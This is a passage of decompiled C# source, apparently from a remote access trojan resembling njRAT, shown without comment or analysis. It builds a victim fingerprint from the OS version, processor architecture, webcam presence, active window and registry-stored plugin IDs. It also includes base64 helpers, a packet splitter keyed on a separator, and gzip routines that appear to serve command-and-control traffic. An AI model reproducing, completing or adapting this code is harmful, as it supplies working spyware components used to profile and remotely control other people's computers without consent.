		text = text + FR() + Y;
		try
		{
			text = text + Gcc(7u) + Y;
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			text = text + "X" + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text += ((ServerComputer)F).get_Info().get_OSFullName().Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			text += "??";
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + "x" + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE")!.ToLower().Replace("amd", "").Replace("x", "") + Y;
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			text += Y;
			ProjectData.ClearProjectError();
		}
		text = ((!Cam()) ? (text + "No" + Y) : (text + "Yes" + Y));
		text = text + VR + Y;
		text = text + " " + Y;
		text = text + ACT() + Y;
		string text5 = "";
		try
		{
			string[] valueNames = ((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG, RegistryKeyPermissionCheck.Default)
				.GetValueNames();
			foreach (string text6 in valueNames)
			{
				if (text6.Length == 32)
				{
					text5 = text5 + text6 + ",";
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	public string FR()
	{
		try
		{
			return LO.LastWriteTime.ToString("yyyy-MM-dd");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "unknown";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string ENB(ref string s)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		return Convert.ToBase64String(bytes);
	}

	public string DEB(ref string s)
	{
		byte[] bytes = Convert.FromBase64String(s);
		return Encoding.UTF8.GetString(bytes);
	}

	public static object rn(int NumberOfChars)
	{
		if (NumberOfChars <= 1)
		{
			MyApplication.s();
			return "";
		}
		string text = "";
		Random random = new Random();
		char[] array = new char[26]
		{
			'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
			'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
			'u', 'v', 'w', 'x', 'y', 'z'
		};
		checked
		{
			for (int i = 0; i <= NumberOfChars; i++)
			{
				text += Conversions.ToString(array[random.Next(0, array.Length - 1)]);
			}
			return text;
		}
	}

	public byte[] SB(ref string S)
	{
		return Encoding.Default.GetBytes(S);
	}

	public string BS(ref byte[] B)
	{
		return Encoding.Default.GetString(B);
	}

	public Array fx(byte[] b, string spl)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(BS(ref b), spl, -1, (CompareMethod)0);
		memoryStream.Write(b, 0, array[0].Length);
		checked
		{
			memoryStream2.Write(b, array[0].Length + spl.Length, b.Length - (array[0].Length + spl.Length));
			list.Add(memoryStream.ToArray());
			list.Add(memoryStream2.ToArray());
			memoryStream.Dispose();
			memoryStream2.Dispose();
			return list.ToArray();
		}
	}

	public byte[] ZIP(byte[] B, ref bool CM)
	{
		checked
		{
			if (CM)
			{
				MemoryStream memoryStream = new MemoryStream();
				GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true);
				gZipStream.Write(B, 0, B.Length);
				gZipStream.Dispose();
				memoryStream.Position = 0L;
				byte[] array = new byte[(int)memoryStream.Length + 1];
				memoryStream.Read(array, 0, array.Length);
				memoryStream.Dispose();
				return array;
			}
			MemoryStream memoryStream2 = new MemoryStream(B);
			GZipStream gZipStream2 = new GZipStream(memoryStream2, CompressionMode.Decompress);
			byte[] array2 = new byte[4];
			memoryStream2.Position = memoryStream2.Length - 5L;
			memoryStream2.Read(array2, 0, 4);
			int num = BitConverter.ToInt32(array2, 0);
			memoryStream2.Position = 0L;
			byte[] array3 = new byte[num - 1 + 1];
			gZipStream2.Read(array3, 0, num);
			gZipStream2.Dispose();
			memoryStream2.Dispose();
			return array3;
		}
	}

	[SpecialName]
	private void _Lambda_0024__1(object object_0)
	{
		Ind((byte[])object_0);
	}
}
